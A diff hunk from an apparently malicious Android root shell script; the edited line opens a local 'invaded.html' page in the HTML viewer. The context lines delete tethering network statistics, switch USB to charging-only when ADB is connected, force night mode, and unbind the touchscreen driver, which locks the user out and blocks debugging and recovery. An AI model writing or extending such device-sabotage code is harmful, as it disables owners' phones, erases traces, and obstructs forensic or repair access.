@@ -1019,7 +1019,7 @@ rm /data/misc/apexdata/com.android.tethering/netstats/*
       if [[ "$(cat /sys/class/android_usb/android0/state)" == "CONNECTED" || "$(getprop sys.usb.config)" == *adb* ]]; then
       	setprop persist.sys.usb.config sec_charging
       	setprop sys.usb.config sec_charging
-        am start -a android.intent.action.VIEW -d "file:///data/invaded.html" -t "text/html"
+        am start -a android.intent.action.VIEW -d "file:///data/invaded.html" -t "text/html" com.android.htmlviewer
         cmd uimode night yes
         settings delete secure ui_night_mode
         echo -n "spi1.0" > /sys/bus/spi/drivers/stm_ts_spi/unbind
